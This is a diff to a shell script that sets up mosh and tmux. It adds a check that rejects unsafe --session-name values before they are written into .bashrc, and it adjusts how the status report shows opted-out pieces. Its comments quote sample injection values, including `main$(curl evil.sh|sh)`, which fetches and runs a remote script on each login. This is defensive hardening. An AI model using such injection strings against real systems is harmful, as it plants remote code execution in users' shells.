@@ -85,6 +85,31 @@ while [ $# -gt 0 ]; do
     esac
 done
 
+# --- Validate session name ---
+# SESSION_NAME gets interpolated into the .bashrc HEREDOC at write time
+# (unquoted heredoc, so shell command substitution would fire). A value
+# like `main$(curl evil.sh|sh)` would embed a command-substitution that
+# runs on every SSH login — worse under --target-user where the write
+# targets another user's bashrc. Restrict to the tmux-session-safe
+# character set. Fixes bugbot PR #59 MED 3120729880.
+#
+# `case` is used instead of `grep -E` because grep splits its input into
+# lines — a value containing a newline (e.g. --session-name $'main\nevil')
+# would pass a per-line anchored regex but still inject a second line
+# into .bashrc. `case` matches the full string without line splitting.
+case "$SESSION_NAME" in
+    '')
+        echo "❌ --session-name cannot be empty." >&2
+        exit 1
+        ;;
+    *[!a-zA-Z0-9_.-]*)
+        echo "❌ Invalid --session-name: $(printf '%q' "$SESSION_NAME")" >&2
+        echo "   Allowed: letters, digits, underscore, dot, hyphen. No spaces, newlines," >&2
+        echo "   or shell metacharacters. Examples: main, dev, teisutis, sprint-042, team.api" >&2
+        exit 1
+        ;;
+esac
+
 # --- Resolve target user + their home dir ---
 # Under `sudo`, $SUDO_USER holds the original invoker; without it, we're
 # running as a plain user and $USER is correct. The rc-file edits must
@@ -141,8 +166,18 @@ fi
 
 echo "   mosh installed:        $([ $MOSH_OK      -eq 1 ] && echo ✅ || echo ❌)"
 echo "   tmux installed:        $([ $TMUX_OK      -eq 1 ] && echo ✅ || echo ❌)"
-echo "   ~/.tmux.conf managed:  $([ $TMUX_CONF_OK -eq 1 ] && echo ✅ || echo ❌)  ($TMUX_CONF)"
-echo "   .bashrc auto-attach:   $([ $RC_OK        -eq 1 ] && echo ✅ || echo ❌)  ($BASHRC)"
+# Display mirrors the --check exit-code logic below: opted-out pieces
+# show "n/a" rather than ❌ so the visual report matches the exit code.
+if [ "$DO_TMUX_CONFIG" = "1" ]; then
+    echo "   ~/.tmux.conf managed:  $([ $TMUX_CONF_OK -eq 1 ] && echo ✅ || echo ❌)  ($TMUX_CONF)"
+else
+    echo "   ~/.tmux.conf managed:  —  (n/a: --no-tmux-config)"
+fi
+if [ "$DO_AUTOATTACH" = "1" ]; then
+    echo "   .bashrc auto-attach:   $([ $RC_OK -eq 1 ] && echo ✅ || echo ❌)  ($BASHRC)"
+else
+    echo "   .bashrc auto-attach:   —  (n/a: --no-autoattach)"
+fi
 if [ "$UFW_APPLICABLE" = "1" ]; then
     echo "   ufw rule for mosh:     $([ $UFW_OK -eq 1 ] && echo ✅ || echo ❌)  (60000:61000/udp)"
 else
